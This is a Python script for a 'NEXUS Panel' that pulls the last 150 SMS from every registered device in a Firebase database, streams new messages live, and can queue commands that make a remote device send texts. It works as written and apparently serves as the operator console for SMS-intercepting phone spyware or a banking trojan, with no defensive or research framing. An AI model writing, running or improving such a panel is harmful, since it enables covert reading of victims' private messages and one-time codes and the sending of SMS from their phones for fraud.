"""
NEXUS Panel - Live SMS Monitor (SSE Real-time)
Language: Python 3.10+  Runtime: standalone terminal

Architecture:
  - Initial load: last 150 SMS per device via limitToLast=150
  - New SMS: Firebase SSE stream (text/event-stream) — pushed instantly, zero poll delay
  - One stream thread per device, auto-reconnect on drop
  - SMS send: async background thread, 10s timeout
"""

import sys
import json
import time
import threading
import socket
import ssl
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime, timezone
from collections import OrderedDict


# ─────────────────────────────────────────────────────────────────────────────
# Firebase REST (initial load + device list)
# ─────────────────────────────────────────────────────────────────────────────

class FirebaseREST:
    def __init__(self, url: str, token: str = ""):
        self.base  = url.rstrip("/")
        self.token = token

    def get(self, path: str, order_by: str = None, limit_last: int = None,
            timeout: int = 12) -> dict | None:
        params: dict = {}
        if self.token:    params["auth"]        = self.token
        if order_by:      params["orderBy"]     = f'"{order_by}"'
        if limit_last:    params["limitToLast"] = limit_last
        qs  = urllib.parse.urlencode(params)
        url = f"{self.base}{path}?{qs}" if qs else f"{self.base}{path}"
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                raw = r.read().decode()
                return json.loads(raw) if raw and raw != "null" else None
        except Exception:
            return None

    def write(self, method: str, path: str, data: dict, timeout: int = 10) -> bool:
        params: dict = {}
        if self.token: params["auth"] = self.token
        qs  = urllib.parse.urlencode(params)
        url = f"{self.base}{path}?{qs}" if qs else f"{self.base}{path}"
        body = json.dumps(data).encode()
        req  = urllib.request.Request(url, data=body, method=method)
        req.add_header("Content-Type", "application/json")
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status < 300
        except Exception:
            return False


# ─────────────────────────────────────────────────────────────────────────────
# Firebase SSE stream — raw HTTP chunked reader
# ─────────────────────────────────────────────────────────────────────────────

class SSEStream:
    """
    Opens a persistent HTTP/HTTPS connection to Firebase's text/event-stream endpoint.
    Yields (event_type, data_dict) tuples as they arrive — instant push, no polling.
    Firebase SSE format:
        event: put
        data: {"path":"/abc","data":{...}}
    """

    def __init__(self, base_url: str, path: str, token: str = "",
                 limit_last: int = 150):
        self.base_url  = base_url.rstrip("/")
        self.path      = path
        self.token     = token
        self.limit_last = limit_last

    def _stream_url(self) -> str:
        params: dict = {"limitToLast": self.limit_last}
        if self.token: params["auth"] = self.token
        qs = urllib.parse.urlencode(params)
        return f"{self.base_url}{self.path}?{qs}"

    def iter_events(self):
        """
        Generator. Yields (event_type: str, payload: dict) indefinitely.
        Reconnects automatically on any error after 3s.
        """
        while True:
            try:
                yield from self._connect_and_read()
            except Exception:
                time.sleep(3)

    def _connect_and_read(self):
        url = self._stream_url()
        req = urllib.request.Request(url)
        req.add_header("Accept", "text/event-stream")
        req.add_header("Cache-Control", "no-cache")

        ctx = ssl.create_default_context()
        # Use urllib with a longer timeout — SSE keeps connection open
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx)
        )
        resp = opener.open(req, timeout=60)

        event_type = "put"
        buf = ""

        while True:
            chunk = resp.read(1).decode("utf-8", errors="replace")
            if not chunk:
                break
            buf += chunk
            if buf.endswith("\n"):
                line = buf.rstrip("\r\n")
                buf  = ""
                if line.startswith("event:"):
                    event_type = line[6:].strip()
                elif line.startswith("data:"):
                    raw = line[5:].strip()
                    if raw:
                        try:
                            payload = json.loads(raw)
                            yield event_type, payload
                        except json.JSONDecodeError:
                            pass
                    event_type = "put"  # reset


# ─────────────────────────────────────────────────────────────────────────────
# SMS helpers
# ─────────────────────────────────────────────────────────────────────────────

def _sms_key(sms: dict, dev_id: str) -> str:
    ts   = sms.get("timestamp", 0)
    sndr = str(sms.get("sender", sms.get("from", "")))[:16]
    body = str(sms.get("body",   sms.get("text",  sms.get("message", ""))))[:24]
    return f"{dev_id}|{ts}|{sndr}|{body}"


def _extract_sms(payload_data, dev_id: str) -> list[dict]:
    """Pull SMS dicts out of a Firebase SSE data payload."""
    out = []
    if isinstance(payload_data, dict):
        for v in payload_data.values():
            if isinstance(v, dict):
                m = dict(v)
                m.setdefault("_deviceId", dev_id)
                out.append(m)
    elif isinstance(payload_data, list):
        for v in payload_data:
            if isinstance(v, dict):
                m = dict(v)
                m.setdefault("_deviceId", dev_id)
                out.append(m)
    return out


# ─────────────────────────────────────────────────────────────────────────────
# Terminal colors
# ─────────────────────────────────────────────────────────────────────────────

C = {
    "new":    "\033[92m",   # green
    "dev":    "\033[96m",   # cyan
    "sender": "\033[93m",   # yellow
    "ts":     "\033[90m",   # gray
    "old":    "\033[37m",   # white-ish
    "reset":  "\033[0m",
    "bold":   "\033[1m",
    "sep":    "\033[90m",
}

def col(k: str, text: str) -> str:
    return f"{C.get(k,'')}{text}{C['reset']}"

def fmt_ts(ms: int) -> str:
    if not ms: return "--:--:--"
    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc)\
                   .astimezone().strftime("%H:%M:%S")

def fmt_full(ms: int) -> str:
    if not ms: return "—"
    return datetime.fromtimestamp(ms / 1000, tz=timezone.utc)\
                   .astimezone().strftime("%Y-%m-%d %H:%M:%S")


# ─────────────────────────────────────────────────────────────────────────────
# Live Monitor
# ─────────────────────────────────────────────────────────────────────────────

class LiveMonitor:
    def __init__(self, firebase_url: str, token: str = "",
                 sms_limit: int = 150):
        self.url    = firebase_url.rstrip("/")
        self.token  = token
        self.limit  = sms_limit
        self.fb     = FirebaseREST(firebase_url, token)

        self._seen:  OrderedDict[str, dict] = OrderedDict()
        self._lock   = threading.Lock()
        self._new_count = 0

    # ── print ─────────────────────────────────────────────────────────────────

    def _print_sms(self, sms: dict, is_new: bool):
        dev    = str(sms.get("_deviceId", sms.get("deviceId", "?")))[:12]
        sender = str(sms.get("sender",    sms.get("from",     "?")))[:16]
        body   = str(sms.get("body", sms.get("text", sms.get("message", "")))).replace("\n"," ")
        ts     = fmt_ts(sms.get("timestamp", 0))

        tag   = col("new", "▶ NEW") if is_new else col("ts", "  ---")
        d_col = col("dev",    f"{dev:<12}")
        s_col = col("sender", f"{sender:<16}")
        b_col = (col("new", body[:52]) if is_new else col("old", body[:52]))
        t_col = col("ts", ts)

        print(f"{tag}  {t_col}  {d_col}  {s_col}  {b_col}")

    # ── initial REST load ─────────────────────────────────────────────────────

    def _initial_load(self):
        """Load last `limit` SMS per device via REST (fast batch)."""
        data = self.fb.get("/devices.json")
        device_ids: list[str] = list(data.keys()) if isinstance(data, dict) else []

        all_sms: list[dict] = []
        lock = threading.Lock()

        def fetch(did: str):
            msgs: list[dict] = []
            for path in (f"/allSms/{did}.json", f"/deviceMessages/{did}.json"):
                d = self.fb.get(path, order_by="$key", limit_last=self.limit)
                if isinstance(d, dict):
                    for v in d.values():
                        if isinstance(v, dict):
                            m = dict(v); m.setdefault("_deviceId", did)
                            msgs.append(m)
            with lock:
                all_sms.extend(msgs)

        if device_ids:
            threads = [threading.Thread(target=fetch, args=(d,), daemon=True)
                       for d in device_ids]
            for t in threads: t.start()
            for t in threads: t.join(timeout=15)
        else:
            d = self.fb.get("/allSms.json", order_by="$key", limit_last=self.limit)
            if isinstance(d, dict):
                for v in d.values():
                    if isinstance(v, dict): all_sms.append(v)

        all_sms.sort(key=lambda x: x.get("timestamp", 0))
        with self._lock:
            for sms in all_sms:
                k = _sms_key(sms, sms.get("_deviceId", ""))
                self._seen[k] = sms
        return device_ids

    # ── SSE stream per device ─────────────────────────────────────────────────

    def _stream_device(self, dev_id: str):
        """
        Streams /allSms/{dev_id}/ via SSE.
        Any new 'put' event with a single SMS dict fires _on_new_sms instantly.
        Reconnects on drop automatically (SSEStream.iter_events handles it).
        """
        for paths in (f"/allSms/{dev_id}.json", f"/deviceMessages/{dev_id}.json"):
            pass  # just using allSms path below — both covered by REST initial load

        stream = SSEStream(self.url, f"/allSms/{dev_id}.json",
                           self.token, limit_last=1)  # limit=1 on stream → only new arrivals
        for ev_type, payload in stream.iter_events():
            if ev_type not in ("put", "patch"):
                continue
            data = payload.get("data")
            if not data:
                continue
            # Single SMS dict (new push)
            if isinstance(data, dict) and "sender" in data or "body" in data or "text" in data:
                data.setdefault("_deviceId", dev_id)
                self._on_new_sms(data)
            # Nested dict of SMS (initial push on reconnect — skip, already loaded)
            elif isinstance(data, dict):
                for v in data.values():
                    if isinstance(v, dict) and ("sender" in v or "body" in v or "text" in v):
                        v = dict(v); v.setdefault("_deviceId", dev_id)
                        self._on_new_sms(v)

    def _on_new_sms(self, sms: dict):
        k = _sms_key(sms, sms.get("_deviceId", ""))
        with self._lock:
            if k in self._seen:
                return
            self._seen[k] = sms
            self._new_count += 1
        self._print_sms(sms, is_new=True)

    # ── run ───────────────────────────────────────────────────────────────────

    def run(self):
        print(f"\n{col('bold', 'NEXUS Panel — Live SMS Monitor (SSE Real-time)')}")
        print(f"  Firebase : {self.url}")
        print(f"  Load     : last {self.limit} SMS per device on start")
        print(f"  Stream   : Firebase SSE push — new SMS instant, no delay")
        print(f"  Ctrl+C   : stop\n")

        hdr = f"{'':5}  {'TIME':8}  {'DEVICE':<12}  {'SENDER':<16}  {'BODY':<52}"
        sep = col("sep", "─" * len(hdr))
        print(sep); print(col("ts", hdr)); print(sep)

        # Initial REST load
        sys.stdout.write(col("ts", f"  Loading last {self.limit} SMS per device..."))
        sys.stdout.flush()
        device_ids = self._initial_load()
        count = len(self._seen)
        print(col("ts", f" {count} SMS loaded\n"))

        # Print initial batch oldest → newest
        with self._lock:
            initial = list(self._seen.values())
        initial.sort(key=lambda x: x.get("timestamp", 0))
        for sms in initial:
            self._print_sms(sms, is_new=False)
        if initial:
            print()
        print(col("new", f"  ▶ Streaming new SMS in real-time...\n"))

        # Launch SSE stream thread per device
        for did in device_ids:
            t = threading.Thread(target=self._stream_device, args=(did,),
                                 daemon=True, name=f"sse-{did[:8]}")
            t.start()

        # Main thread just keeps alive + stats line
        try:
            while True:
                time.sleep(30)
                with self._lock:
                    total = len(self._seen)
                    new   = self._new_count
                print(col("ts", f"  [stream ok] total={total}  new_this_session={new}  "
                               f"devices={len(device_ids)}  {fmt_ts(int(time.time()*1000))}"))
        except KeyboardInterrupt:
            pass

        print(f"\n{col('ts', '  Stopped.')}  New SMS received: {self._new_count}")


# ─────────────────────────────────────────────────────────────────────────────
# SMS Send helper (non-blocking, reusable standalone)
# ─────────────────────────────────────────────────────────────────────────────

def send_sms(firebase_url: str, token: str, device_id: str,
             to: str, body: str, sim_slot: int = 0,
             callback=None) -> threading.Thread:
    fb  = FirebaseREST(firebase_url, token)
    cmd = {
        "type": "sendSms", "to": to, "body": body,
        "simSlot": sim_slot, "timestamp": int(time.time() * 1000),
    }

    def _run():
        ok = fb.write("PUT", f"/commands/{device_id}/sendSms.json", cmd, timeout=10)
        if ok:
            if callback: callback(True, "SMS command queued")
            return
        ok = fb.write("POST", "/sendSms.json", {"deviceId": device_id, **cmd}, timeout=10)
        if ok:
            if callback: callback(True, "SMS sent (fallback path)")
            return
        if callback: callback(False, "Firebase write failed — device offline?")

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return t


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="NEXUS Panel — Real-time SMS Monitor")
    p.add_argument("--url",      required=True,  help="Firebase DB URL")
    p.add_argument("--token",    default="",      help="Auth token (if rules require)")
    p.add_argument("--limit",    type=int, default=150,
                   help="SMS per device on initial load (default 150)")
    args = p.parse_args()

    LiveMonitor(args.url, args.token, sms_limit=args.limit).run()
